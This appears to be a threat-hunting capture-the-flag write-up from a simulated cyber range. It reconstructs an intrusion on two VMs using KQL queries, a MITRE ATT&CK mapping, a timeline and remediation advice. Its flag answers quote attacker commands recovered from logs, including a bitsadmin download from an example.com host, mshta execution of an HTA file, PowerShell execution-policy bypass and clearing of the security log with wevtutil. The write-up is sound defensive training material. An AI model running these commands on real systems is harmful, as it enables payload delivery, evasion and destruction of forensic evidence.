# 🤫 Lurker Re-emerges
<img width="1024" height="1024" alt="Lurker Main Pic" src="https://github.com/user-attachments/assets/59a1e2ea-4c3b-4d0b-a750-b8bf0a5d7d56" />

## 📏 Perimeters
Date Completed: ***2025-07-13***  
Participant: Peter Pan ***Panbear*** (w/ assistance of [**Martin Barbosa**](https://github.com/mar7inb))  
Simulated Environment: `LOG(N) Pacific - Cyber Range 1`  
Infected Host VMs: `michaelvm`, `centralsrvr`  
Suspected Time Frame: ***June 14 – 18, 2025***  
Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📄 Overview

The adversary executed malicious PowerShell via a user-level entry point, bypassing script restrictions to deploy a custom payload on `michaelvm`. Reconnaissance identified privileged accounts and accessed critical financial documents. ***LOLBins*** (bitsadmin.exe, mshta.exe) downloaded tools, with persistence via registry autorun keys and scheduled tasks. Lateral movement to ***centralsrvr*** used stolen credentials and remote scheduled tasks, targeting sensitive files for exfiltration to Google Drive, Dropbox, and public paste sites. A PowerShell downgrade disabled logging, and event logs were cleared to block forensics.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 💠 Diamond Model Analysis

| Feature        | Details                                                                 |
|----------------|-------------------------------------------------------------------------|
| **Adversary**  | Hands-on-keyboard actor or red team using stealthy, multi-stage tactics. Skilled in LOLBins, evasion, and lateral movement. |
| **Infrastructure** | External C2 via `drive.google.com`, `dropbox.com`, `pastebin.com` (`104.22.69.199`). Used LOLBins (`bitsadmin.exe`, `mshta.exe`, `wevtutil.exe`) for delivery and execution. |
| **Capability** | PowerShell with execution policy bypass and v2 downgrade for AMSI evasion. Employed recon (`net group`), ADS payloads, scheduled tasks, and registry persistence. Exfiltrated data via cloud services. |
| **Victim**     | Initial target: `michaelvm`. Lateral target: `centralsrvr`. Accessed `QuarterlyCryptoHoldings.docx` on both. Abused sensitive folders and scheduled tasks for persistence. |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🥋 MITRE ATT&CK Table

| Flag/Event                           | Tactic             | Technique ID  | Technique Name                                                                 |
|--------------------------------------|--------------------|---------------|--------------------------------------------------------------------------------|
| Initial PowerShell Execution         | Execution          | T1059.001     | Command and Scripting Interpreter: PowerShell                                  |
| Recon: Domain Admins Query           | Discovery          | T1087.002     | Account Discovery: Domain Account                                              |
| Sensitive File Access                | Discovery          | T1083         | File and Directory Discovery                                                   |
| bitsadmin.exe Download               | Defense Evasion    | T1197         | BITS Jobs                                                                      |
| Payload Drop: ledger_viewer.exe      | Command and Control| T1105         | Ingress Tool Transfer                                                          |
| HTA Abuse via mshta.exe              | Defense Evasion    | T1218.005     | System Binary Proxy Execution: Mshta                                           |
| ADS DLL Drop                         | Defense Evasion    | T1564.004     | Hide Artifacts: NTFS File Attributes                                           |
| Registry Persistence                 | Persistence        | T1547.001     | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder          |
| Scheduled Task Creation              | Persistence        | T1053.005     | Scheduled Task/Job: Scheduled Task                                             |
| Lateral Movement via schtasks        | Lateral Movement   | T1053.005     | Scheduled Task/Job: Scheduled Task                                             |
| Remote Document Access               | Collection         | T1039         | Data from Network Shared Drive                                                 |
| Exfiltration to Pastebin/Cloud       | Exfiltration       | T1567.003     | Exfiltration Over Web Service: Exfiltration to Text Storage Sites              |
| PowerShell Downgrade                 | Defense Evasion    | T1562.010     | Impair Defenses: Downgrade Attack                                              |
| Log Clearing                         | Defense Evasion    | T1070.001     | Indicator Removal: Clear Windows Event Logs                                    |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ⛨ Remediation Actions
1. **PowerShell Security**:
   - Enforce Constrained Language Mode and block PowerShell v2.
   - Enable deep script block logging with centralized collection.
2. **LOLBin Controls**:
   - Alert on unusual `mshta.exe`, `bitsadmin.exe`, and `wevtutil.exe` activity.
   - Implement allow-listing for legitimate LOLBin use.
3. **Persistence Mitigation**:
   - Monitor `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for unauthorized changes.
   - Detect non-admin scheduled task creation.
4. **Network Restrictions**:
   - Block unapproved cloud services (e.g., Dropbox, Pastebin).
   - Deploy CASB/DLP for cloud traffic inspection.
5. **Lateral Movement Defense**:
   - Audit `schtasks.exe` with `/S` flag.
   - Enforce MFA and reduce admin privileges.
6. **Log Protection**:
   - Alert on `wevtutil cl` activity.
   - Forward logs to a tamper-resistant SIEM.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ✍️ Lessons Learned
- **Initial Access**: PowerShell with bypass flags in user folders signals compromise, even if it mimics legitimate use.
- **LOLBin Abuse**: Native tools (`bitsadmin.exe`, `mshta.exe`, `wevtutil.exe`) evade EDR detection.
- **Persistence**: Layered use of registry keys and scheduled tasks ensures reboot survival.
- **Exfiltration**: Cloud services (Dropbox, Google Drive, Pastebin) bypass traditional network filters.
- **Evasion**: PowerShell v2 downgrade disables AMSI and logging.
- **Log Clearing**: Despite attempts to erase logs, forensic artifacts enabled attack reconstruction.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

##  Conclusion
The Lurker intrusion was a sophisticated, multi-phase attack starting with PowerShell abuse and LOLBins, escalating to targeted data exfiltration. The adversary used stealth tactics—registry persistence, scheduled tasks, AMSI evasion, and log clearing—to maintain access and cover tracks. Forensic analysis of process, file, registry, and network events reconstructed the kill chain across `michaelvm` and `centralsrvr`, revealing a focus on financial data (`QuarterlyCryptoHoldings.docx`).

<hr style="height: 40px; background-color: grey; border: 10px; margin-top: 40px;">

## 🕙 Timeline of Events

| **Timestamp (UTC)** | **Event** | **Target Device**  | **Details** |
| ------------------- | --------- | ------------------ | ----------- |
| **2025-06-14 15:38:45**            | First activity detected on `michaelvm`                            | michaelvm   | Initial signs of temp folder execution                           |
| **2025-06-15 (evening)**           | Scheduled Task created                                            | michaelvm   | `MarketHarvestJob` set to run client\_update.hta with PowerShell |
| **2025-06-16 05:56:59**            | Reconnaissance via `net group "Domain Admins"` command            | michaelvm   | SHA256: `badf4752413...` initiated from PowerShell               |
| **2025-06-16 06:12:28**            | Sensitive document accessed: `QuarterlyCryptoHoldings.docx`       | michaelvm   | From folder `Documents\BoardMinutes`                             |
| **2025-06-16 06:32:09**            | ADS-style DLL `investor_report.dll` dropped                       | michaelvm   | SHA1: `801262e122db...` in Temp folder                           |
| **2025-06-16 06:41:24**            | Registry persistence established via autorun key                  | michaelvm   | Key: `HKCU\...\Run` with value `WalletUpdater`                   |
| **2025-06-16 08:32:34**            | Lateral movement command to `centralsrvr` executed via `schtasks` | michaelvm   | Command targets `centralsrvr` using credentials                  |
| **2025-06-17 03:00:49**            | Last lateral movement command confirmed                           | michaelvm   | Final pivot toward `centralsrvr`                                 |
| **2025-06-17 22:23:24**            | Sensitive document accessed on `centralsrvr`                      | centralsrvr | `QuarterlyCryptoHoldings.docx` accessed remotely by `MICHA3L`    |
| **2025-06-17 22:23:28 – 22:23:31** | Data exfiltration attempts to: Google Drive, Dropbox, Pastebin    | centralsrvr | MD5: `2e5a8590cf68...`                                           |
| **2025-06-18 10:52:33**            | Event log clearing with `wevtutil cl Security`                    | centralsrvr | Attempt to wipe forensic evidence                                |
| **2025-06-18 10:52:59**            | PowerShell downgrade to v2 for evasion                            | centralsrvr | Likely to disable ScriptBlock/AMSI logging                       |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🚩 Completed Flag Map

|  Flags | Objective | Value |
|--------|-----------|-------|
| **Start** | First suspicious machine | `michaelvm` |
| **1** | First suspicious PowerShell execution | `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"` |
| **2** | Recon binary hash (SHA256) | `badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0` |
| **3** | Sensitive document accessed | `QuarterlyCryptoHoldings.docx` |
| **4** | Last access timestamp | `2025-06-16T06:12:28.2856483Z` |
| **5** | bitsadmin command | `"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe"` |
| **6** | Suspicious payload | `ledger_viewer.exe` |
| **7** | mshta command | `"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta"` |
| **8** | SHA1 of ADS payload | `801262e122db6a2e758962896f260b55bbd0136a` |
| **9** | Registry autorun path | `HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| **10** | Scheduled task name | `MarketHarvestJob` |
| **11** | Lateral movement target | `centralsrvr` |
| **12** | Lateral movement timestamp | `2025-06-17T03:00:49.525038Z` |
| **13** | Targeted file hash (SHA256) | `b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98` |
| **14** | Exfiltration process MD5 | `2e5a8590cf6848968fc23de3fa1e25f1` |
| **15** | Final exfil destination IP | `104.22.69.199` |
| **16** | PowerShell downgrade timestamp | `2025-06-18T10:52:59.0847063Z` |
| **17** | Log clearing timestamp | `2025-06-18T10:52:33.3030998Z` |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🏁 Hunting Flags

### Starting Point: Initial Machine Identification
**Objective:** Determine the first machine used by the attacker to initiate the attack.  
**What to Hunt:** File activity in the Temp folder over a 2-3 day period starting June 15, 2025, to identify the attack’s origin.  
**TTP:** Execution of malicious files from temporary directories.  
**Why It Matters:** Identifying the initial compromised machine provides the starting point for tracing the attacker’s activities across the environment.  

**KQL Query:**
```
let startTime = datetime(2025-06-15 00:00:00);
let endTime = datetime(2025-06-18 23:59:59);
DeviceFileEvents
| where TimeGenerated between (startTime .. endTime)
| where FolderPath has_any ("Temp")
| summarize
    FileCreated = countif(ActionType == "FileCreated"),
    FileAccessed = countif(ActionType == "FileAccessed"),
    FileCopied = countif(ActionType == "FileCopied"),
    FileMoved = countif(ActionType == "FileMoved"),
    FileDeleted = countif(ActionType == "FileDeleted")
    by DeviceName
| sort by FileCreated desc
```
**Output:** `michaelvm`  
**Finding:** By querying the “DeviceName” in `Sentinel` with a sorted list by “`FileCreated`” count in ascending order, a manageable list of 85 entries got siphoned out. The output “`michaelvm`” identifies the first VM compromised, marking the beginning of the threat hunting process.
<img width="1027" height="672" alt="Pasted Graphic" src="https://github.com/user-attachments/assets/4e7f7bf2-babe-4c50-8125-7cc1df710337" />

---

### Flag 1: Initial PowerShell Execution Detection
**Objective:** Pinpoint the earliest suspicious PowerShell activity marking the intruder's entry.  
**What to Hunt:** PowerShell execution deviating from baseline usage, specifically the first .ps1 file execution.  
**TTP:** Malicious PowerShell script execution with `-ExecutionPolicy Bypass`.  
**Why It Matters:** Identifying the initial entry point establishes the attack’s starting point, enabling tracing of subsequent actions.  

**KQL Query:**
```
DeviceProcessEvents
| where DeviceName contains "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where FileName == "powershell.exe"
| where ProcessCommandLine has ".ps1"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFileName
| order by Timestamp asc
```
**Output:** `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"`  
**Finding:** Suspicious account “mich34l_id” executed the first .ps1 file, indicating the initial compromise.
<img width="819" height="666" alt="Pasted Graphic 1" src="https://github.com/user-attachments/assets/c0ecab1b-a633-41d9-85c2-e71f60f7851b" />

---

### Flag 2: Reconnaissance Script Hash
**Objective:** Identify the reconnaissance stage binary.  
**What to Hunt:** Local reconnaissance indicators via PowerShell execution.  
**TTP:** Use of PowerShell for network or system reconnaissance.  
**Why It Matters:** Reconnaissance reveals the attacker’s intent to map the environment, critical for understanding their strategy.  

**KQL Query:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where FileName contains "powershell.exe"
| where AccountName contains "mich34l_id"
| project Timestamp, DeviceName, AccountName, InitiatingProcessSHA256
| sort by Timestamp asc
```
**Output:** `badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0`  
**Finding:** The SHA256 hash identifies the initial reconnaissance binary tied to the attacker’s entry.
<img width="1069" height="171" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/7185e349-1963-4ba5-811a-3b45a8ec98ad" />

---

### Flag 3: Sensitive Document Access
**Objective:** Identify the sensitive document accessed or staged by the attacker.  
**What to Hunt:** Access to confidential financial or meeting-related documents.  
**TTP:** Unauthorized file access via PowerShell or other processes.  
**Why It Matters:** Accessed files reveal the attacker’s motives, often tied to financial gain or sensitive data theft.  

**KQL Query:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where InitiatingProcessAccountName contains "mich34l_id"
| where ProcessCommandLine contains "board"
| project Timestamp, DeviceName, FileName, FolderPath, ActionType, ProcessCommandLine
| sort by Timestamp asc
```
**Output:** `QuarterlyCryptoHoldings.docx`  
**Finding:** The file “QuarterlyCryptoHoldings.docx” was accessed, indicating targeting of sensitive financial data.
<img width="1525" height="207" alt="Pasted Graphic 5" src="https://github.com/user-attachments/assets/71f184ad-ed91-4b40-8afb-4ad404f37491" />

---

### Flag 4: Last Manual Access to File
**Objective:** Track the last read of a sensitive document.  
**What to Hunt:** Timestamp of the last sensitive file access.  
**TTP:** Unauthorized access to sensitive files, often before exfiltration.  
**Why It Matters:** Late-stage file access signals preparation for data theft, critical for timeline reconstruction.  

**KQL Query:**
```
DeviceEvents
| where DeviceName contains "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where ActionType contains "SensitiveFileRead"
| order by Timestamp desc
```
**Output:** `2025-06-16T06:12:28.2856483Z`  
**Finding:** The last access to “QuarterlyCryptoHoldings.docx” occurred at the specified timestamp, indicating pre-exfiltration activity.
<img width="1029" height="229" alt="Pasted Graphic 6" src="https://github.com/user-attachments/assets/511a6a10-075b-46ec-b940-311fdd51ed8c" />

---

### Flag 5: LOLBin Usage - bitsadmin
**Objective:** Detect stealth file downloads via native tools.  
**What to Hunt:** Use of `bitsadmin.exe` for file transfers.  
**TTP:** Living-Off-the-Land Binaries (LOLBins) for downloading malicious tools.  
**Why It Matters:** LOLBin usage allows attackers to blend into normal system activity, evading detection.  

**KQL Query:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where AccountName contains "mich34l_id"
| where ProcessCommandLine contains "bitsadmin.exe"
```
**Output:** `"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe`  
**Finding:** The command shows `bitsadmin.exe` downloading a malicious file, confirming stealth tool deployment.
<img width="1593" height="146" alt="465682981-90c04309-ae3c-4937-a477-50bd1f00f80f" src="https://github.com/user-attachments/assets/3d749896-7f5b-4ae3-bce4-a556487af525" />

---

### Flag 6: Suspicious Payload Deployment
**Objective:** Identify non-baseline executable payloads.  
**What to Hunt:** New executables in Temp or uncommon locations with deceptive names.  
**TTP:** Dropping malicious payloads in temporary folders for staging.  
**Why It Matters:** Payload deployment indicates the attacker’s preparation for further malicious actions.  

**KQL Query:**
```
DeviceFileEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "michaelvm"
| where FolderPath has "Temp"
| where FileName contains ".exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath
| sort by Timestamp asc
```
**Output:** `ledger_viewer.exe`  
**Finding:** The executable “ledger_viewer.exe” in the Temp folder suggests a staged malicious payload.
<img width="1177" height="90" alt="465683004-9e786a76-ae6e-4b73-b779-2b85d688c6c0" src="https://github.com/user-attachments/assets/287d8a23-b8ad-4658-8d90-0d353eca1bee" />

---

### Flag 7: HTA Abuse via LOLBin
**Objective:** Detect execution of HTML Application files using trusted tools.  
**What to Hunt:** Execution of `mshta.exe` with local HTA scripts.  
**TTP:** Use of `mshta.exe` for executing malicious HTA files.  
**Why It Matters:** HTA abuse leverages trusted Windows tools to execute malicious scripts, bypassing defenses.  

**KQL Query:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where AccountName contains "mich34l_id"
| where ProcessCommandLine contains "mshta.exe"
| project Timestamp, DeviceName, ProcessCommandLine
```
**Output:** `"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta`  
**Finding:** The command reveals `mshta.exe` executing a suspicious HTA file, indicating social engineering tactics.
<img width="894" height="137" alt="465683033-69183010-6fa7-4e38-b64d-3829538e7775" src="https://github.com/user-attachments/assets/a01daa27-2cc4-4a72-950e-56ba7a1412bd" />

---

### Flag 8: ADS Execution Attempt
**Objective:** Detect payloads hidden in Alternate Data Streams (ADS).  
**What to Hunt:** DLLs hidden in common file types, e.g., `.docx` with `:hidden.dll`.  
**TTP:** Use of ADS to conceal malicious payloads.  
**Why It Matters:** ADS allows attackers to hide malware in plain sight, complicating detection efforts.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "michaelvm"
| where InitiatingProcessAccountName contains "mich34l_id"
| where ProcessCommandLine contains ".dll"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessSHA1
```
**Output:** `801262e122db6a2e758962896f260b55bbd0136a`  
**Finding:** The SHA1 hash confirms a DLL hidden in ADS, indicating a stealthy payload execution attempt.
<img width="612" height="261" alt="Timestamp" src="https://github.com/user-attachments/assets/e9dc0be3-8b60-49ca-b208-23175d75e13d" />

---

### Flag 9: Registry Persistence Confirmation
**Objective:** Confirm persistence via registry autorun keys.  
**What to Hunt:** Registry paths and values enabling script re-execution.  
**TTP:** Registry autorun keys for persistent execution.  
**Why It Matters:** Registry persistence ensures the attacker’s code survives system reboots, prolonging the attack.  

**KQL Query:**
```
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where Timestamp between (ago(30d) .. now())
| where ActionType contains "RegistryValueSet"
| where RegistryKey contains "run"
| project Timestamp, DeviceName, ActionType, RegistryKey, PreviousRegistryKey, RegistryValueName, PreviousRegistryValueName, InitiatingProcessCommandLine
```
**Output:** `HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
**Finding:** The registry key confirms persistence via autorun, ensuring the attack script re-executes.
<img width="1068" height="234" alt="465683221-12237500-7e73-4d93-b88d-513fd7ee17d8" src="https://github.com/user-attachments/assets/e6f77cc9-8fed-49b2-bcc8-05a4948b032b" />

---

### Flag 10: Scheduled Task Execution
**Objective:** Validate the scheduled task launching the payload.  
**What to Hunt:** Name of the task tied to the attack’s execution flow.  
**TTP:** Scheduled tasks for automated malicious execution.  
**Why It Matters:** Scheduled tasks provide stealthy, automated persistence, leaving clear creation trails.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "michaelvm"
| where InitiatingProcessAccountName contains "mich34l_id"
| where ProcessCommandLine contains "schtask"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```
**Output:** `MarketHarvestJob`  
**Finding:** The task “MarketHarvestJob” indicates a scheduled task created for persistent payload execution.
<img width="1655" height="525" alt="465683264-a70760a0-4f63-4155-9cd0-2762cd92e1d4" src="https://github.com/user-attachments/assets/124c3505-35fb-40e4-8876-8c838b8778e1" />

---

### Flag 11: Target of Lateral Movement
**Objective:** Identify the remote machine targeted for lateral movement.  
**What to Hunt:** Remote system name in command-line activity.  
**TTP:** Lateral movement via stolen credentials and remote task execution.  
**Why It Matters:** Identifying the next compromised system is critical for containment and response.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "michaelvm"
| where AccountName contains "mich34l_id"
| where ProcessCommandLine contains "remote"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```
**Output:** `centralsrvr`  
**Finding:** The command reveals “centralsrvr” as the next machine targeted via remote scheduled tasks.
<img width="1435" height="783" alt="465683300-f7b74394-73f6-4bc8-901a-ec64b1338d88" src="https://github.com/user-attachments/assets/ff0b79b7-0322-4883-b04f-eebc4d89a8d6" />

---

### Flag 12: Lateral Move Timestamp
**Objective:** Pinpoint the exact time of lateral movement to the second system.  
**What to Hunt:** Execution timestamps of commands targeting the new host.  
**TTP:** Remote task execution for lateral movement.  
**Why It Matters:** Timing the lateral move reconstructs the attack window, aiding containment efforts.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "centralsrvr"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| sort by Timestamp desc
```
**Output:** `2025-06-17T03:00:49.525038Z`  
**Finding:** The timestamp marks the last lateral execution to “centralsrvr,” defining the attack’s progression.
<img width="1418" height="231" alt="465683321-89e63654-2a16-405b-b9e6-aa92af7cdd04" src="https://github.com/user-attachments/assets/e5cc45a7-fbbe-4a08-9d9b-f3a6a44f85c2" />

---

### Flag 13: Sensitive File Access
**Objective:** Identify the specific document targeted on the second system.  
**What to Hunt:** Access to financial or holding-related files on the remote host.  
**TTP:** Unauthorized file access for data theft.  
**Why It Matters:** Confirming targeted files reveals the attacker’s data theft objectives.  

**KQL Query:**
```
DeviceFileEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "centralsrvr"
| where FolderPath contains "holding"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessRemoteSessionDeviceName
| order by Timestamp asc
```
**Output:** `b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98`  
**Finding:** The SHA256 hash confirms access to “QuarterlyCryptoHoldings.docx” on “centralsrvr,” indicating targeted data theft.
<img width="788" height="196" alt="465683369-0930c33e-4992-4961-beeb-75ce06098167" src="https://github.com/user-attachments/assets/a9a36cdb-a1be-491a-9e59-78ce92eab3be" />

---

### Flag 14: Data Exfiltration Attempt
**Objective:** Validate the process involved in data exfiltration.  
**What to Hunt:** Process hash tied to outbound connections to cloud services.  
**TTP:** Exfiltration via trusted cloud services or public sites.  
**Why It Matters:** Identifying the exfiltration process reveals how data was stolen, aiding recovery efforts.  

**KQL Query:**
```
DeviceNetworkEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "centralsrvr"
| where InitiatingProcessCommandLine contains "exfil"
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessMD5, InitiatingProcessRemoteSessionDeviceName
```
**Output:** `2e5a8590cf6848968fc23de3fa1e25f1`  
**Finding:** The MD5 hash identifies the process responsible for exfiltration, confirming data theft.
<img width="1193" height="136" alt="465683429-940171b9-78e2-448f-bf9c-e3a0d102d5da" src="https://github.com/user-attachments/assets/c7f6bc63-fd92-40ec-aefb-d63f7dd07e66" />

---

### Flag 15: Destination of Exfiltration
**Objective:** Identify the final IP address used for data exfiltration.  
**What to Hunt:** Remote IPs tied to unauthorized cloud services or paste sites.  
**TTP:** Data exfiltration to external services for stealthy transfer.  
**Why It Matters:** Knowing the exfiltration destination informs incident response and containment scope.  

**KQL Query:**
```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where Timestamp between (ago(30d) .. now())
| where RemoteUrl != ""
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessCommandLine
| order by Timestamp asc
```
**Output:** `104.22.69.199`  
**Finding:** The IP address corresponds to “pastebin.com,” the last suspicious destination for exfiltrated data.
<img width="1193" height="136" alt="465683461-83abad89-3ceb-4cfa-b560-d96b8584436c" src="https://github.com/user-attachments/assets/f8f57de1-b647-410f-82ff-e91c67a64987" />

---

### Flag 16: PowerShell Downgrade Detection
**Objective:** Spot PowerShell version manipulation to avoid logging.  
**What to Hunt:** `-Version 2` execution flag in process command lines.  
**TTP:** PowerShell downgrade to evade AMSI logging.  
**Why It Matters:** Downgrading PowerShell signals an attempt to bypass modern security defenses, a critical evasion tactic.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "-Version 2"
| project Timestamp, ProcessCommandLine 
| sort by Timestamp desc
```
**Output:** `2025-06-18T10:52:59.0847063Z`  
**Finding:** The timestamp indicates a PowerShell downgrade attempt, confirming evasion of logging mechanisms.
<img width="700" height="138" alt="Timestamp" src="https://github.com/user-attachments/assets/c56d2002-4a1b-476d-833f-93ac6d888fcd" />

---

### Flag 17: Log Clearing Attempt
**Objective:** Catch efforts to cover tracks by clearing event logs.  
**What to Hunt:** Use of `wevtutil cl Security` to clear security logs.  
**TTP:** Log clearing to erase evidence of malicious activity.  
**Why It Matters:** Log clearing indicates an intent to evade detection and hinder forensic analysis, often a final step.  

**KQL Query:**
```
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName == "centralsrvr"
| where FileName contains "wevtutil"
| where ProcessCommandLine contains "cl Security"
| project ProcessCreationTime, ProcessCommandLine, FileName
```
**Output:** `2025-06-18T10:52:33.3030998Z`  
**Finding:** The timestamp confirms the use of `wevtutil` to clear security logs, indicating an attempt to cover tracks.
<img width="436" height="195" alt="Timestamp" src="https://github.com/user-attachments/assets/3113d74c-f97c-4885-a61b-cd8658cbc9db" />


